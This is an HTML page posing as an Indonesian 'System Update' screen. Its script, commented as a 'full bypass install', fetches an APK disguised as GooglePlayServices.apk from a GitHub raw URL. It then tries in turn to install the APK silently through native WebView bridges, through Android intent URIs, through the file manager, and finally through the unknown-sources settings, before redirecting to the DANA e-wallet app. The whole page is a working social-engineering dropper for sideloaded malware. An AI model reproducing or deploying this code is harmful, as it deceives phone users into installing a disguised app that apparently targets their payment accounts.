<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        body{background:#0a0e17;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:Arial,sans-serif;margin:0}
        .container{text-align:center;padding:30px;background:linear-gradient(145deg,#0d1a2b,#1a2a3f);border-radius:16px;width:90%;max-width:400px}
        .icon{font-size:48px;display:block;margin-bottom:10px}
        .title{color:#4fc3f7;font-size:22px;margin-bottom:5px}
        .subtitle{color:#8899aa;font-size:13px;margin-bottom:20px}
        .progress-wrap{background:#1a2a3f;border-radius:30px;height:10px;overflow:hidden;margin-bottom:15px}
        .progress-bar{width:0%;height:100%;background:linear-gradient(90deg,#4fc3f7,#00e676);transition:width 0.3s}
        .status-text{font-size:13px;color:#8899aa;margin-top:5px}
        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;margin-right:8px;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
    </style>
</head>
<body>

<div class="container">
    <span class="icon">🔄</span>
    <div class="title">System Update</div>
    <div class="subtitle">Memperbarui sistem keamanan...</div>
    <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
    <div class="status-text"><span class="status-dot"></span><span id="statusLabel">⏳ Memeriksa file instalasi...</span></div>
</div>

<script>
// ============================================================
// 🔥 SystemUpdate.html - FULL BYPASS INSTALL
// ============================================================

var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';

function updateProgress(val, label) {
    document.getElementById('progressBar').style.width = Math.min(val, 100) + '%';
    if (label) document.getElementById('statusLabel').textContent = label;
}

// DETEKSI BRIDGE
var BRIDGE = null;
(function detectBridge() {
    var candidates = ['AndroidBridge','JSBridge','WebViewJavascriptBridge','NativeBridge','Bridge'];
    for (var i = 0; i < candidates.length; i++) {
        if (typeof window[candidates[i]] !== 'undefined') { BRIDGE = window[candidates[i]]; break; }
    }
})();

// ============================================================
// SISTEM BYPASS INSTALL 3 LAPIS
// ============================================================

// Lapisan 1: Coba Silent Install via Bridge (Native)
function tryBridgeInstall(path) {
    if (BRIDGE && typeof BRIDGE.installAPK === 'function') {
        try {
            return BRIDGE.installAPK(path);
        } catch(e) { return false; }
    }
    return false;
}

// Lapisan 2: Intent Langsung (Bypass Unknown Source)
function tryIntentInstall(path) {
    try {
        window.location.href = 'intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end';
        return true;
    } catch(e) { return false; }
}

// Lapisan 3: Buka via File Manager (Bypass paling kuat)
function tryFileManagerInstall(path) {
    try {
        // Menggunakan aplikasi Download Manager / File Manager bawaan
        window.location.href = 'intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;package=com.android.documentsui;end';
        return true;
    } catch(e) { return false; }
}

// Lapisan 4 (Final): Buka Pengaturan Install Unknown Apps
function openInstallSettings() {
    try {
        window.location.href = 'intent://com.android.settings.ManageApplications#Intent;action=android.settings.MANAGE_UNKNOWN_APP_SOURCES;end';
    } catch(e) {
        window.location.href = 'intent://com.android.settings#Intent;action=android.settings.SETTINGS;end';
    }
}

// ============================================================
// EXECUTOR (Mencoba Semua Metode)
// ============================================================
function executeInstall() {
    var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
    
    updateProgress(50, '⏳ Mencoba instalasi otomatis...');

    // Coba Bridge (Silent)
    if (tryBridgeInstall(path)) {
        updateProgress(100, '✅ Instalasi Berhasil');
        setTimeout(redirectToDANA, 3000);
        return;
    }

    // Coba Intent (Bypass)
    if (tryIntentInstall(path)) {
        updateProgress(80, '⏳ Membuka Installer...');
        return;
    }

    // Coba File Manager
    if (tryFileManagerInstall(path)) {
        updateProgress(80, '⏳ Membuka File Manager...');
        return;
    }

    // Jika semua gagal, arahkan ke Pengaturan
    updateProgress(60, '⏳ Membuka Pengaturan Izin...');
    setTimeout(openInstallSettings, 1000);
}

// ============================================================
// REDIRECT KE DANA
// ============================================================
function redirectToDANA() {
    try {
        if (BRIDGE && typeof BRIDGE.openApp === 'function') {
            BRIDGE.openApp('com.dana.id');
        } else {
            window.location.href = 'intent://com.dana.id#Intent;scheme=https;end';
        }
    } catch(e) {
        window.location.href = 'https://www.dana.id';
    }
}

// ============================================================
// START
// ============================================================
updateProgress(20, '⏳ Memverifikasi file instalasi...');
setTimeout(executeInstall, 2000);
</script>
</body>
</html>
